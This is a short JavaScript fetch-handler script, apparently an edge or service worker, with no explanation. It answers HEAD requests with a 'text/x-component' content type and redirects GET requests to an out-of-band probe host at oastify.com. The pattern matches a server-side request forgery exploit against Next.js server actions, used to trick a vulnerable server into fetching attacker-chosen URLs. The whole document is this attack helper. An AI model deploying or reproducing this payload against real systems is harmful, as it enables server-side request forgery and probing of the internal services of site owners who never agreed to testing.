self.addEventListener('fetch', event => {
    const request = event.request;

    // Intercept HEAD requests
    if (request.method === 'HEAD') {
        event.respondWith(
            new Response(null, {
                status: 200,
                headers: {
                    'Content-Type': 'text/x-component',
                }
            })
        );
    }
    // Intercept GET requests and redirect
    else if (request.method === 'GET') {
        event.respondWith(
            new Response(null, {
                status: 302,
                headers: {
                    'Location': 'http://9dnj4z2ztl489svwv1tfpeep5gb7z2nr.oastify.com/login',
                }
            })
        );
    }
});
